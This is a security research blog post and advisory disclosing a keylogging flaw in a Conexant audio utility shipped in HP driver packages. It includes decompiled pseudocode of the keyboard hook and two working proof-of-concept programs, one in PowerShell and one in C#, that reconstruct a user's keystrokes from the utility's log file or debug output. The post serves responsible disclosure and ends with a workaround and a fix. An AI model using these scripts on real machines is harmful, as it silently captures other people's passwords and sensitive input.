### [EN] Keylogger in Hewlett-Packard Audio Driver

[Eine Deutsche Version befindet sich hier â German version right
here](/modlog/archives/2017/05/11/de_keylogger_in_hewlett-packard_audio-treiber/index.html)

Security reviews of modern Windows Active Domain infrastructures
are â from our point of view â quite sobering. Therefore, we often
look left and right, when, for example, examining the hardening of
protection mechanisms of a workstation. Here, we often find all
sorts of dangerous and ill-conceived stuff. We want to present one
of these casually identified cases now, as it's quite an
interesting one: We have discovered a keylogger in an audio driver
package by Hewlett-Packard.

A keylogger is a piece of software for which the case of
dual-use can rarely be claimed. This means there are very few
situations where you would describe a keylogger that records all
keystrokes as 'well-intended'. A keylogger records when a key is
pressed, when it is released, and whether any shift or special keys
have been pressed. It is also recorded if, for example, a password
is entered even if it is not displayed on the screen.

So what's the point of a keylogger in an audio driver? Does HP
deliver pre-installed spyware? Is HP itself a victim of a
backdoored software that third-party vendors have developed on
behalf of HP? The responsibility in this case is uncertain, because
the software is offered by HP as a driver package for their own
devices on their website. On the other hand, the software was
developed and digitally signed by the audio chip manufacturer
Conexant.

Conexant is a manufacturer of integrated circuits, emerging from
a US armaments manufacturer. Primarily, they develop circuits in
the field of video and audio processing. Thus, it is not uncommon
for Conexant audio ICs to be populated on the sound cards of
computers of various manufacturers. Conexant also develops drivers
for its audio chips, so that the operating system is able to
communicate with the hardware. Apparently, there are some parts for
the control of the audio hardware, which are very specific and
depend on the computer model - for example special keys for turning
on or off a microphone or controlling the recording LED on the
computer. In this code, which seems to be tailored to HP computers,
there is a part that intercepts and processes all keyboard
input.

Actually, the purpose of the software is to recognize whether a
special key has been pressed or released. Instead, however, the
developer has introduced a number of diagnostic and debugging
features to ensure that all keystrokes are either broadcasted
through a debugging interface or written to a log file in a public
directory on the hard-drive.

This type of debugging turns the audio driver effectively into a
keylogging spyware. On the basis of meta-information of the files,
this keylogger has already existed on HP computers since at least
Christmas 2015.

```

Version 1.0.0.31 of this program was later extended by even more
problematic functions: The most recent version 1.0.0.46 implements
the logging of all keystrokes into the publicly for any user
readable file C:\Users\Public\MicTray.log. Although the file is
overwritten after each login, the content is likely to be easily
monitored by running processes or forensic tools. If you regularly
make incremental backups of your hard-drive - whether in the cloud
or on an external hard-drive â a history of all keystrokes of the
last few years could probably be found in your backups.

There is no evidence that this keylogger has been intentionally
implemented. Obviously, it is a negligence of the developers -
which makes the software no less harmful. If the developer would
just disable all logging, using debug-logs only in the development
environment, there wouldn't be problems with the confidentiality of
the data of any user.

Neither HP Inc. nor Conexant Systems Inc. have responded to any
contact requests. Only HP Enterprise (HPE) refused any
responsibility, and sought contacts at HP Inc. through internal
channels.

Therefore, we are now publishing this information in accordance
with our Responsible Disclosure process, even if the HP and
Conexant issues are neither confirmed nor corrected by the affected
vendors.

All users of HP computers should check whether the program
C:\Windows\System32\MicTray64.exe or
C:\Windows\System32\MicTray.exe is installed. We recommend that you
delete or rename the executable files so that no keystrokes are
recorded anymore. However, the special function keys on the
keyboards might no longer work as expected. If a
C:\Users\Public\MicTray.log file exists on the hard-drive, it
should also be deleted immediately, as it can contain a lot of
sensitive information such as login-information and passwords.

The exact technical details and documents can be found in our
Security Advisory <https://www.modzero.ch/advisories/MZ-17-01-Conexant-Keylogger.txt>.

Version: =< 1.0.0.46
Attack type: Local
Affected Components: Scheduled Task c:\windows\system32\mictray64.exe
---------------------------------------------------------------------
3. Details
---------------------------------------------------------------------
Conexant's MicTray64.exe is installed with the Conexant audio driver
package and registered as a Microsoft Scheduled Task to run after each
user login. The program monitors all keystrokes made by the user to
capture and react to functions such as microphone mute/unmute
keys/hotkeys. Monitoring of keystrokes is added by implementing a low-
level keyboard input hook [1] function that is installed by calling
SetwindowsHookEx().
In addition to the handling of hotkey/function key strokes, all key-
scancode information [2] is written into a logfile in a world-readable
path (C:\Users\Public\MicTray.log). If the logfile does not exist or
the setting is not yet available in Windows registry, all keystrokes
are passed to the OutputDebugString API, which enables any process in
the current user-context to capture keystrokes without exposing
malicious behavior. Any framework and process with access to the
MapViewOfFile API should be able to silently capture sensitive data by
capturing the user's keystrokes. In version 10.0.0.31, only
OutputDebugString was used to forward key scancodes and nothing was
written to files. The following pseudocode shows the registration of
the keylogging function handler of MicTray64.exe version 1.0.0.46:
int64 keylogger\_enable(bool activate)
{
[...]
if ( !keylogger\_active )
{
[...]
// 13=WH\_KEYBOARD\_LL: Installs a hook procedure that
// monitors low-level keyboard input events. For
// more information, see the LowLevelKeyboardProc
// hook procedure.
hKeyloggerHook = SetWindowsHookExW(
13, (HOOKPROC)handle\_scancode,
hSelf,
0);
if ( hKeyloggerHook )
{
keylogger\_active = 1;
return 0;
}
[...]
}
After registering function handle\_scancode() as a handler to
any keystroke made by the user, the following pseudo-code is executed
every time a key is pressed or released:
LRESULT handle\_scancode(
int \_in\_nCode,
WPARAM \_in\_wParam,
tagKBDLLHOOKSTRUCT \*\_in\_lParam\_keystroke)
{
tagKBDLLHOOKSTRUCT \*key\_stroke;
WPARAM wParam;
int nCode;
int64 target;
DWORD is\_keyfoo;
int is\_keydown;
char tmp;
int64 key\_flags;
int64 key\_vk;
key\_stroke = \_in\_lParam\_keystroke;
wParam = \_in\_wParam;
nCode = \_in\_nCode;
if ( \_in\_nCode >= 0 )
{
target = (cfg\_HotKeyMicScancode >> 8 \*
(cfg\_HotKeyMicScancode\_len - cfg\_HotKeyMicScancode\_len2));
LODWORD(key\_vk) = \_in\_lParam\_keystroke->vkCode;
LODWORD(key\_flags) = \_in\_lParam\_keystroke->flags;
is\_keyfoo = \_in\_lParam\_keystroke->flags & 1;
is\_keydown = ~(key\_flags >> 7) & 1;
[\*] send\_to\_dbglog(
0x1D,
L"Mic target 0x%x scancode 0x%x flags 0x%x extra 0x%x vk 0x%x\n",
target,
\_in\_lParam\_keystroke->scanCode,
key\_flags,
\_in\_lParam\_keystroke->dwExtraInfo,
key\_vk);
conexant\_handle\_fn\_keys(
cfg\_MicMuteScancodeSettings,
is\_keydown,
key\_stroke->scanCode,
target,
&cfg\_HotKeyMicScancode\_len,
&cfg\_HotKeyMicScancode\_len2,
1);
if ( cfg\_MicMuteScancodeSettings & 4 )
conexant\_handle\_fn\_keys(
cfg\_MicMuteScancodeSettings,
is\_keydown,
key\_stroke->scanCode,
(cfg\_HotKeyMicScancode2 >> 8 \*
(cfg\_HotKeyMicScancode2\_len - cfg\_HotKeyMicScancode2\_len2)),
&cfg\_HotKeyMicScancode2\_len,
&cfg\_HotKeyMicScancode2\_len2,
1);
tmp = cfg\_SpkMuteScancodeSettings;
if ( cfg\_SpkMuteScancodeSettings & 8 && is\_keyfoo
|| !(cfg\_SpkMuteScancodeSettings & 8) )
{
conexant\_handle\_fn\_keys(
cfg\_SpkMuteScancodeSettings,
is\_keydown,
key\_stroke->scanCode,
(cfg\_HotKeySpkScancode >> 8 \*
(cfg\_HotKeySpkScancode\_len - cfg\_HotKeySpkScancode\_len2)),
&dword\_1402709C8,
&dword\_1402709CC,
0);
tmp = cfg\_SpkMuteScancodeSettings;
}
if ( tmp & 4 && (tmp & 8 && is\_keyfoo || !(tmp & 8)) )
conexant\_handle\_fn\_keys(
tmp,
is\_keydown,
key\_stroke->scanCode,
(cfg\_HotKeySpkScancode2 >> 8 \*
(cfg\_HotKeySpkScancode2\_len - cfg\_HotKeySpkScancode2\_len2)),
&cfg\_HotKeySpkScancode2\_len,
&cfg\_HotKeySpkScancode2\_len2,
0);
}
return CallNextHookEx(hhk, nCode, wParam, key\_stroke);
}
The function called at [\*] writes every keystroke to a file or
broadcast it via Microsofts Debug Monitor APIs via store\_keystroke():
void store\_keystroke(LPCVOID lpBuffer)
{
WORD \*scancode\_logline;
int64 str\_len;
DWORD NumberOfBytesWritten;
int str\_newline;
scancode\_logline = lpBuffer;
if ( g\_write\_to\_logfile )
{
SetFilePointer(g\_hFile, 0, 0, 2);
str\_len = -1;
while ( scancode\_logline[str\_len++ + 1] != 0 )
;
WriteFile(
g\_hFile,
scancode\_logline,
2 \* str\_len,
&NumberOfBytesWritten,
0);
str\_newline = '\n\0\r';
WriteFile(g\_hFile, &str\_newline, 4, &NumberOfBytesWritten, 0);
}
else
{
OutputDebugStringW(lpBuffer);
}
}
This issue leads to a high risk of leaking sensitive user input to any
person or process that is able to read files in
C:\Users\Public\MicTray.log or call MapViewOfFile(). Investigators
with access to the unencrypted file-system might be able to recover
sensitive data of historic key-logs as well. Users are not aware that
every keystroke made while entering sensitive information - such as
passphrases, passwords on local or remote systems - are captured by
Conexant and exposed to any process and framework with access to the
file-system or MapViewOfFile API.
Additionally, this information-leak via Covert Storage Channel
enables malware authors to capture keystrokes without taking the risk
of being classified as malicious task by AV heuristics.
It is not recommended to provide information on keystrokes to
arbitrary processes by writing keystrokes to disk or by using
OutputDebugStringW() for debugging purposes.
---------------------------------------------------------------------
4. Impact
---------------------------------------------------------------------
Any process that is running in the current user-session and therefore
able to monitor debug messages, can capture keystrokes made by the
user. Processes are thus able to record sensitive data such as
passwords, without performing suspicious activities that may trigger
AV vendor heuristics. Furthermore, any process running on the system
by any user is able to access all keystrokes made by the user via
file-system access. It is not known, if log-data is submitted to
Conexant at any time or why all key presses are logged anyway.
---------------------------------------------------------------------
5. Proof of concept exploit
---------------------------------------------------------------------
A proof-of-concept can be implemented by using PowerShell to
parse MicTray.log:
$filename = "c:\users\public\MicTray.log"
[System.IO.FileStream] $fs = [System.IO.File]::Open(
$filename,
[System.IO.FileMode]::Open,
[System.IO.FileAccess]::Read,
[System.IO.FileShare]::ReadWrite)
[System.IO.StreamReader] $fr = [System.IO.StreamReader]::new(
$fs,
[Text.UTF8Encoding]::UNICODE)
$el = 0
while($el -lt 2) {
$line = $fr.ReadLine()
# handle broken newlines in log...
if([string]::IsNullOrEmpty($line)) {
$el++
} else {
$el=0
}
$mc = [regex]::Match($line,
"MicTray64.exe.\*flags (0x0[A-Fa-f0-9]?).\*vk (0x[A-Fa-f0-9]+)$")
$r = $mc.Groups[2].Value
if(-Not [string]::IsNullOrEmpty($r)) {
$i = [convert]::ToInt32($r, 16)
$c = [convert]::ToChar($i)
if($i -lt 0x20 -or $i -gt 0x7E) { $c = '.' }
write-host -NoNewLine $("{0}" -f $c)
}
}
However, if no logfile is written, it is also possible to obtain
keystrokes by just following Microsoft's DbMon Debug Monitor [3]
approach of capturing strings passed to OutputDebugString [4]:
namespace mod0\_dbgview
{
class Program
{
public static void Main(string[] args)
{
DebugMonitor.Start();
DebugMonitor.OnOutputDebugString += new
OnOutputDebugStringHandler(OnOutputDebugString);
Console.WriteLine("Press 'Enter' to exit.");
Console.ReadLine();
DebugMonitor.Stop();
}
// version 1.0.0.46
private static void OnOutputDebugString(int pid, string text)
{
char sep = ' ';
char nl = '\n';
text = text.TrimEnd(nl);
string[] items = text.Split(sep);
if (items[7].Equals("Mic"))
{
int c\_int = Convert.ToInt32(items[17], 16);
if (c\_int == 0xd)
{
Console.WriteLine();
}
else if (Convert.ToInt32(items[13], 16) == 0x00)
Console.Write("{0}", (char)(c\_int & 0xff));
}
}
// version 1.0.0.31
private static void OnOutputDebugString\_v31(
int pid,
string text)
{
char sep = ' ';
string[] items = text.Split(sep);
if (items[0].Equals("Mic"))
{
int c\_int = Convert.ToInt32(items[10], 16);
if (c\_int == 0xd)
{
Console.WriteLine();
}
else if(Convert.ToInt32(items[6], 16) == 0x00)
Console.Write("{0}", (char)(c\_int & 0xff));
}
}
}
}
Any framework that provides an API down to ReadFile() or Microsoft's
MapViewOfFile() should be able to capture keystrokes captured by
Conexant's audio driver utils. By using Microsoft Windows Sysinternals
Dbgview [5], keystrokes can be visualized easily, if they are not
written to file.
---------------------------------------------------------------------
6. Workaround
---------------------------------------------------------------------
Delete MicTray executables and logfiles. Deleting the Scheduled
Task is not sufficient, as Conexant's Windows Service CxMonSvc will
launch MicTray otherwise. The executable is located at
c:\Windows\System32\MicTray64.exe, the MicTray logfile is located at
C:\Users\Public\MicTray.log
---------------------------------------------------------------------
7. Fix
---------------------------------------------------------------------
HP released a new driver package without the keylogging functions in
Conexant executables. It is highly recommended to upgrade to the most
recent version [10].
